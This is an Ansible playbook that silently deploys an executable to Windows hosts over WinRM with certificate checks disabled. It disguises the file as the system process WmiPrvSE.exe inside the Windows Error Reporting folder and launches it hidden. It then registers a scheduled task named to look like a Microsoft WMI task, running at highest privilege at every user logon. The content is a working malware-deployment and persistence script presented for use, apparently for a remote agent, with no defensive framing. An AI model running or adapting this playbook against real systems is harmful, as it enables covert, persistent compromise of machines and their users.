---
- name: Deploy and Run Gundo Silently on SkatingRink
  hosts: windows
  gather_facts: no
  vars:
    ansible_connection: winrm
    ansible_winrm_transport: ntlm
    ansible_winrm_server_cert_validation: ignore
    target_dir: 'C:\ProgramData\Microsoft\Windows\WER'

  tasks:
    - name: Ensure target directory exists
      ansible.windows.win_file:
        path: "{{ target_dir }}"
        state: directory

    - name: Drop the binary
      ansible.windows.win_copy:
        src: "files/proper.exe"
        dest: "{{ target_dir }}\\WmiPrvSE.exe"

    - name: Launch agent silently in the background (Right Now)
      ansible.windows.win_shell: |
        Start-Process -FilePath "{{ target_dir }}\WmiPrvSE.exe" -ArgumentList "client" -WindowStyle Hidden

    - name: Create Persistent Task for All Users
      ansible.windows.win_shell: |
        $Action = New-ScheduledTaskAction -Execute "conhost.exe" -Argument "--headless ""{{ target_dir }}\WmiPrvSE.exe"" client"
        $Trigger = New-ScheduledTaskTrigger -AtLogOn
        $Principal = New-ScheduledTaskPrincipal -GroupId "BUILTIN\Users" -RunLevel Highest
        Register-ScheduledTask -TaskName "WMI Performance Adapter" -TaskPath "\Microsoft\Windows\WMI" -Action $Action -Trigger $Trigger -Principal $Principal -Force
        Write-Host "[+] Persistent task created."
